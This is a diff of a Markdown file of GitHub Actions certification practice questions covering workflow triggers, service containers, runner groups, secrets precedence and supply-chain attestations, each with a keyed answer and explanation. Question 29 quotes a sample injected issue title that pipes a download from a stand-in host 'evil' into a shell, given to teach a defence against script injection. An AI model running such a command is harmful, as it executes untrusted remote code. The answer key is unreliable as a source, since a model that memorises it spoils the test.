@@ -1,11 +1,11 @@
 ---
-last-updated: 2026-08-09
+last-updated: 2026-10-22
 difficulty: intermediate
 ---
 
 # GitHub Actions Certification - Practice Questions
 
-15 questions for the GitHub Actions exam, weighted toward authoring and maintaining workflows (40%), authoring actions (25%), consuming workflows (20%), and enterprise management (15%).
+30 questions for the GitHub Actions exam (GH-200). Questions 16-30 follow the skills measured as of January 2026: author and manage workflows (20-25%), manage GitHub Actions for the enterprise (20-25%), consume and troubleshoot workflows (15-20%), author and maintain actions (15-20%), and secure and optimize automation (10-15%).
 
 > **Cert page:** [exams/github/actions/](../../exams/github/actions/)
 
@@ -277,6 +277,276 @@ D. Cancel manually from the Actions tab each time a newer commit arrives on the 
 **Correct: B**
 
 **Why:** Concurrency groups prevent redundant runs and wasted minutes on superseded commits. For deployments the opposite setting is usually right: same group, `cancel-in-progress: false`, so deployments queue rather than interrupt each other.
+</details>
+
+---
+
+### Question 16
+**Scenario:** A release workflow is started by hand. The person running it must pick an environment from a fixed list and may optionally tick a "dry run" box that defaults to on.
+
+A. Use `repository_dispatch` with a JSON payload and validate the fields in the first step of the job
+B. Read the values from repository variables that the person edits before clicking Run workflow
+C. Use `workflow_dispatch` with a `choice` input for the environment and a `boolean` input defaulting to true
+D. Use `push` with a commit message convention such as `[env:prod]` and `[dry-run]` that a script in the first step parses at runtime
+
+<details>
+<summary>Answer</summary>
+
+**Correct: C**
+
+**Why:** `workflow_dispatch` inputs are typed: a `choice` input shows a fixed list, and a `boolean` input with `default: true` gives the dry-run box, all validated by GitHub before the run starts. `repository_dispatch` is for API callers and has no form or input typing. Editing repository variables before each run is error-prone and changes values for every other workflow too. Parsing commit messages is fragile and is not a manual trigger.
+</details>
+
+---
+
+### Question 17
+**Scenario:** One workflow file repeats the same block of `env` settings in five jobs. The team wants to define it once in that file without creating a reusable workflow or a composite action.
+
+A. Define the mapping once with a YAML anchor (`&common`) and reuse it with an alias or a merge key (`<<: *common`)
+B. Move the block into a separate `env.yml` file and use an `include:` statement at the top of the workflow so every job picks it up
+C. Put the block in a reusable workflow and call it from each of the five jobs with `uses:` at job level
+D. Copy the block with a matrix that has a single entry so every job inherits it through `strategy`
+
+<details>
+<summary>Answer</summary>
+
+**Correct: A**
+
+**Why:** GitHub Actions supports YAML anchors and aliases within a single workflow file, so a mapping defined once with `&` can be reused with `*` or merged with `<<`. Workflow files have no `include:` keyword. A reusable workflow would work for shared jobs, but the question rules it out and it is heavier than needed for a repeated mapping. A matrix generates job variations and does not share settings across separate jobs.
+</details>
+
+---
+
+### Question 18
+**Scenario:** After tests run, the team wants a formatted Markdown table of results to appear on the workflow run's summary page.
+
+A. Upload the table as an artifact named `summary.md`, which GitHub renders automatically on the run page
+B. Echo the table to standard output with a `::notice::` prefix on every line of the table
+C. Write the table to `GITHUB_OUTPUT` so it is shown under the job's outputs section
+D. Append the Markdown to the file named in `GITHUB_STEP_SUMMARY`
+
+<details>
+<summary>Answer</summary>
+
+**Correct: D**
+
+**Why:** Content appended to the `GITHUB_STEP_SUMMARY` file is rendered as Markdown on the run summary page, which is built for test results and coverage. Artifacts are downloadable files and are not rendered on the summary. `::notice::` creates annotations line by line, not a formatted table. `GITHUB_OUTPUT` sets step outputs for later steps and is not displayed as a report.
+</details>
+
+---
+
+### Question 19
+**Scenario:** Integration tests in a job need a PostgreSQL database for the length of the job on a GitHub-hosted Linux runner.
+
+A. Install PostgreSQL in a `run:` step from a third-party package mirror on every run of the job
+B. Declare a `services:` container for PostgreSQL with a health check and mapped port
+C. Start a separate workflow that runs the database and call it with `workflow_call`
+D. Store a database connection string to a shared production database as a repository secret
+
+<details>
+<summary>Answer</summary>
+
+**Correct: B**
+
+**Why:** Service containers start before the job's steps, live for the job, and can be health-checked and reached by port or service name, which is the intended pattern for test databases. Installing PostgreSQL in a step works but is slow and reinvents what `services:` does. A called workflow runs as separate jobs and cannot host a database for another job. Testing against a shared production database risks real data and is never the right answer.
+</details>
+
+---
+
+### Question 20
+**Scenario:** A matrix run of 12 jobs has one failing job caused by a flaky network call. The team wants to retry only that job.
+
+A. Push an empty commit so the whole workflow runs again from the beginning
+B. Edit the workflow to remove the other 11 matrix entries and run it again
+C. Cancel the workflow run and start it again with `workflow_dispatch`
+D. Use "Re-run failed jobs", or re-run that single matrix job from the run page
+
+<details>
+<summary>Answer</summary>
+
+**Correct: D**
+
+**Why:** The run page can re-run only failed jobs or a single job, including one matrix variant, reusing the same commit and inputs. An empty commit reruns everything and adds noise to history. Editing the matrix changes the workflow for a one-off retry. Cancelling and restarting also reruns all 12 jobs and needs a manual trigger to exist.
+</details>
+
+---
+
+### Question 21
+**Scenario:** An organization wants new repositories to start from a standard CI file that each team can then change freely, with no link back to the original.
+
+A. A workflow template (starter workflow) published in the organization's `.github` repository
+B. A reusable workflow in a central repository that each team calls with `uses:` and the `workflow_call` trigger
+C. A composite action that bundles the CI steps and is referenced from each workflow
+D. A required workflow enforced by a repository ruleset on every repository in the org
+
+<details>
+<summary>Answer</summary>
+
+**Correct: A**
+
+**Why:** A workflow template is copied into the repository when chosen, then belongs to that repository with no link back, which matches "change freely". A reusable workflow stays centrally defined and versioned, so changes come from the center. A composite action shares steps, not a whole editable workflow. Required workflows are enforced from the center and cannot be freely changed by teams.
+</details>
+
+---
+
+### Question 22
+**Scenario:** A scheduled workflow must stop running for two weeks during a migration, and then start again with its history intact.
+
+A. Delete the workflow file and restore it from Git history when the migration ends
+B. Rename the file extension from `.yml` to `.txt` so GitHub stops reading it as a workflow
+C. Disable the workflow from the Actions tab or with `gh workflow disable`, then enable it later
+D. Remove the repository's Actions permission at the organization level for the whole two weeks, then grant it back
+
+<details>
+<summary>Answer</summary>
+
+**Correct: C**
+
+**Why:** Disabling a workflow stops new runs while keeping the file and the run history, and enabling it later restores it exactly. Deleting the file loses the workflow from the UI until restored and is a heavier change. Renaming the extension is a hack that also produces a commit and confuses reviewers. Turning off Actions for the whole repository stops every other workflow too.
+</details>
+
+---
+
+### Question 23
+**Scenario:** A team wants to package three shell steps they repeat in many workflows as a single action, without writing JavaScript or building a container.
+
+A. A Docker container action whose entrypoint runs the three shell commands in order
+B. A composite action with `runs: using: composite` and the steps listed in `action.yml`
+C. A JavaScript action whose `index.js` calls the three scripts with `child_process`
+D. A reusable workflow placed in `.github/workflows` and called from a step with `run:`
+
+<details>
+<summary>Answer</summary>
+
+**Correct: B**
+
+**Why:** A composite action lists steps in `action.yml` under `runs: using: composite`, so plain shell steps become one reusable action. A Docker action needs an image, which the team wants to avoid. A JavaScript action needs JavaScript. Reusable workflows are called at job level with `uses:`, not from a step, and they share jobs rather than steps.
+</details>
+
+---
+
+### Question 24
+**Scenario:** An action publisher wants users to get compatible bug fixes automatically while being protected from breaking changes.
+
+A. Tell users to reference `@main` so they always get the newest commit on the default branch
+B. Publish only full commit SHAs and never create tags, so no reference can ever move
+C. Publish every change under the same `v1` tag, including breaking changes, so that users only ever need one version
+D. Use semantic version releases and move a major tag such as `v1` to the latest compatible release
+
+<details>
+<summary>Answer</summary>
+
+**Correct: D**
+
+**Why:** The documented pattern is semantic versions plus a moving major tag: `v1` points to the newest `v1.x.y`, and breaking changes ship as `v2`. Users who want full immutability can still pin a SHA. `@main` exposes users to every unreleased change, including breaking ones. Never tagging removes the easy upgrade path. Shipping breaking changes under `v1` breaks the promise a major tag makes.
+</details>
+
+---
+
+### Question 25
+**Scenario:** An enterprise has self-hosted runners with access to the payments network. Only two organizations, and only selected repositories in them, may use those runners.
+
+A. Put the runners in a runner group and limit the group's access to those organizations and repositories
+B. Label the runners `payments` and trust teams not to use the label in other workflows or in any other organization
+C. Register the runners at the repository level in every repository that might need them
+D. Put the runners behind an IP allow list so only those repositories can reach them
+
+<details>
+<summary>Answer</summary>
+
+**Correct: A**
+
+**Why:** Runner groups control which organizations and repositories may send jobs to a set of runners, which is the access boundary needed. Labels only route jobs and are not an access control. Repository-level registration does not scale and does not stop someone else from registering or reusing them. IP allow lists restrict access to GitHub from networks, not which repositories may run jobs on a runner.
+</details>
+
+---
+
+### Question 26
+**Scenario:** A secret named `API_KEY` exists at organization, repository and environment level with different values. A job runs with `environment: production`. Which value does it get?
+
+A. The organization value, because organization secrets always override narrower scopes
+B. The environment value, because the most specific scope wins
+C. The repository value, because environment secrets are only used by deployment APIs
+D. The job fails with an error, because duplicate secret names across scopes are not allowed
+
+<details>
+<summary>Answer</summary>
+
+**Correct: B**
+
+**Why:** When the same name exists at several levels, the lowest level wins: environment over repository over organization. Organization secrets do not override narrower ones. Environment secrets are available to any job that references the environment. Duplicate names are allowed, which is how per-environment values are meant to work.
+</details>
+
+---
+
+### Question 27
+**Scenario:** A job needs a specific Java version that differs from the default on `ubuntu-latest`. What is the usual approach?
+
+A. Switch the job to a self-hosted runner, because GitHub-hosted images cannot change their preinstalled Java version
+B. Download a JDK in a `run:` step with `curl` and edit `/etc/environment` by hand on each run
+C. Use the matching `setup-*` action, such as `actions/setup-java`, to install and select the version
+D. Open a support ticket so GitHub adds the Java version to the hosted runner image
+
+<details>
+<summary>Answer</summary>
+
+**Correct: C**
+
+**Why:** `setup-*` actions pick a version from the runner's tool cache or download it, then put it on the `PATH`, which is the supported way to change runtimes on hosted runners. Hosted runners can install software at runtime, so a self-hosted runner is not required. Manual downloads work but are slower and harder to maintain. Waiting on an image change is not a plan for one job.
+</details>
+
+---
+
+### Question 28
+**Scenario:** Security wants to allow only GitHub-authored actions, verified Marketplace creators and two named third-party actions across the organization.
+
+A. Add a CODEOWNERS rule on `.github/workflows` in every repository so security reviews every new action reference
+B. Turn on secret scanning push protection for every repository in the organization
+C. Fork each allowed action into the organization and delete the upstream reference
+D. Set the organization's Actions policy to allow GitHub, verified creators and a list of specific actions
+
+<details>
+<summary>Answer</summary>
+
+**Correct: D**
+
+**Why:** The organization Actions policy can restrict use to GitHub-authored actions, verified creators and an explicit allow list, and GitHub enforces it at run time. CODEOWNERS adds review but does not block a merged workflow from using an action. Push protection stops secrets in commits, not action usage. Forking can be part of a strategy, but on its own it blocks nothing.
+</details>
+
+---
+
+### Question 29
+**Scenario:** A workflow runs on new issues and has the step `run: echo "${{ github.event.issue.title }}"`. Why is this risky, and what is the fix?
+
+A. The title is untrusted and is pasted into the shell script; pass it through an `env:` variable and quote it
+B. The step leaks the `GITHUB_TOKEN` into the log; mask the token with `::add-mask::` first
+C. The expression is evaluated at parse time and always fails; move it into a `with:` block instead
+D. Issue titles may contain Unicode that breaks the runner; base64-encode the title before printing it
+
+<details>
+<summary>Answer</summary>
+
+**Correct: A**
+
+**Why:** `${{ }}` is expanded before the shell runs, so a title like `"; curl evil | sh; "` becomes part of the script: that is script injection. Putting the value in an environment variable and referencing `"$TITLE"` makes the shell treat it as data. The step does not print the token. The expression is evaluated at runtime and works, which is the problem. Encoding the title hides the symptom without fixing the injection pattern.
+</details>
+
+---
+
+### Question 30
+**Scenario:** A team wants consumers of their container image to verify which repository and workflow built it before deploying.
+
+A. Add a `LABEL built-by=ci` line to the Dockerfile, which consumers can read from the image config
+B. Generate an artifact attestation for the image in the build workflow and verify it at deploy time
+C. Publish a checksum of the image in the README so consumers can compare it by hand
+D. Sign each release commit with a GPG key held on the maintainer's laptop and documented in the wiki
+
+<details>
+<summary>Answer</summary>
+
+**Correct: B**
+
+**Why:** Artifact attestations create signed provenance tying the image digest to the repository, workflow and commit, and `gh attestation verify` can check it in a deployment gate. A label can be set by anyone who builds an image. A README checksum says nothing about who built it, and the README can change. Signed commits prove who wrote code, not which pipeline built the artifact.
 </details>
 
 ---
